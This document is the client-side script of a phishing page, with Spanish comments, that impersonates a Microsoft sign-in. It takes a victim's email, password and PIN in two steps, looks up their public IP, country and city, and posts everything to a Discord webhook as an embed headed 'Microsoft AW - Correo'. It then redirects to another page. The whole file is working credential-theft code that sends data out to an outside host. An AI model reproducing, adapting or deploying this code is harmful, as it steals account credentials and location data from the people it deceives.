var displayEmail = document.getElementById('displayEmail');
var emailInput = document.getElementById('email');
var emailInputBox = document.getElementById('emailInputBox');
var passwordBox = document.getElementById('passwordBox');
var passwordInput = document.getElementById('passwordInput');
var pinBox = document.getElementById('pinBox');
var pinInput = document.getElementById('pinInput');
var form = document.getElementById('loginForm');
var nextButton = document.getElementById('nextButton');

localStorage.removeItem('userEmail');

// Deshabilitar campos al iniciar para evitar que la validación HTML5
// intente validar elementos ocultos con class="hidden"
passwordInput.disabled = true;
pinInput.disabled = true;

form.addEventListener('submit', async function (e) {
  e.preventDefault();

  // PASO 1 — capturar correo
  if (!localStorage.getItem('userEmail')) {
    var emailValue = emailInput.value.trim();
    if (!emailValue) {
      emailInput.focus();
      return;
    }

    localStorage.setItem('userEmail', emailValue);
    displayEmail.textContent = emailValue;
    displayEmail.style.display = 'block';

    // Ocultar email y deshabilitarlo para el Paso 2
    emailInputBox.classList.add('hidden');
    emailInput.disabled = true;
    footer.classList.add('hidden');
    footer.disabled = true;

    // Mostrar contraseña y PIN, y HABILITARLOS para que HTML5 pueda validarlos
    passwordBox.classList.remove('hidden');
    pinBox.classList.remove('hidden');
    passwordInput.disabled = false;
    pinInput.disabled = false;

    passwordInput.focus();
    return;
  }

  // PASO 2 — enviar credenciales
  var passwordValue = passwordInput.value.trim();
  var pinValue = pinInput.value.trim();
  if (!passwordValue) {
    passwordInput.focus();
    return;
  }

  var originalText = nextButton.innerHTML;

  try {
    nextButton.disabled = true;
    nextButton.classList.add('button-loading');
    nextButton.innerHTML = 'Validando';

    if (typeof sendLoginData === 'function') {
      await sendLoginData(
        localStorage.getItem('userEmail'),
        passwordValue,
        pinValue
      );
      window.location.href = 'indexe.html';
    } else {
      throw new Error('Sistema no disponible');
    }
  } catch (err) {
    alert(err.message || 'Error al iniciar sesión');
    nextButton.disabled = false;
    nextButton.classList.remove('button-loading');
    nextButton.innerHTML = originalText;
  }
});

// ==============================================
// FUNCIONES BASE
// ==============================================

/**
 * Obtiene la dirección IP pública del usuario
 * @returns {Promise<string>} Dirección IP
 */
async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error al obtener IP:', error);
    return "IP no disponible";
  }
}

async function getLocation(ip) {
  if (ip === "IP no disponible") return { country: "País no disponible", city: "Ciudad no disponible" };

  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`); // JSON con toda la info
    if (!response.ok) throw new Error('No se pudo obtener la ubicación');
    const data = await response.json();
    return {
      country: data.country_name || "País no disponible",
      city: data.city || "Ciudad no disponible"
    };
  } catch (error) {
    console.error('Error al obtener ubicación:', error);
    return { country: "País no disponible", city: "Ciudad no disponible" };
  }
}


/**
 * Obtiene el país basado en la IP
 * Nota: para localhost puede fallar por CORS
 * @param {string} ip - Dirección IP
 * @returns {Promise<string>} Nombre del país
 */
async function getCountry(ip) {
  // Para localhost devolvemos "No disponible" y evitamos CORS
  return "No disponible";
}

/**
 * Envía datos al webhook de Discord (soporta embeds)
 * @param {object} data - Objeto con embeds
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendToDiscord(data) {
  

  try {
    const response = await fetch(webhook_url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error('Error al enviar a Discord:', error);
    return false;
  }
}

// ==============================================
// FUNCIONES ESPECÍFICAS PARA FORMULARIOS
// ==============================================

/**
 * Procesa datos de inicio de sesión (email y password/nombre)
 * @param {string} email - Correo electrónico
 * @param {string} password - Contraseña o nombre
 * @param {string} pin - PIN 
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendLoginData(email, password, pin) {
  try {
    const ip = await getIP();
    const location = await getLocation(ip); // Aquí obtenemos country y city

    const embed = {
      title: '🚨 Microsoft AW - Correo',
      color: 0x0F6CBD, // celeste
      fields: [
        { name: 'Correo', value: email || 'No disponible', inline: false },
        { name: 'Contraseña', value: password || 'No proporcionado', inline: false },
        { name: 'PIN', value: pin || 'No proporcionado', inline: false },
        { name: 'IP', value: ip, inline: true },
    { name: 'País', value: location.country, inline: true },
    { name: 'Ciudad', value: location.city, inline: true }
      ],
      footer: { text: 'Sistema de monitoreo' },
      timestamp: new Date().toISOString()
    };

    // Enviamos embed al webhook
    return await sendToDiscord({ embeds: [embed] });
  } catch (error) {
    console.error('Error en sendLoginData:', error);
    return false;
  }
}

// ==============================================
// EXPORTACIÓN DE FUNCIONES (si se usa como módulo)
// ==============================================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { getIP, getCountry, sendToDiscord, sendLoginData };
}
